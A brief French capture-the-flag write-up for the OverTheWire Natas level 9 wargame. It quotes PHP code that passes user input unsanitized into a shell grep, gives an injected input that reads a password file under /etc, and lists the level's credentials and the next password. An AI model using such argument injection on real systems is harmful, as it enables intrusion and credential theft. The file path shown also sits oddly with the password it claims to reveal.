## Connexion (username=natas9 password=UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9)
```
http://natas9.natas.labs.overthewire.org/
```

## Recherche du mot de passe

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
key = ce qu'on met dans l'input. Or si je met

^ /etc/natas_webpass/natas9 

c'est équivalent à:

grep -i ^ /etc/natas_webpass/natas9 dictionary.txt

ca va tout afficher ce qu'il y a dans natas9 et dictionnary.txt ...

## Prochain mot de passe
```
EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
```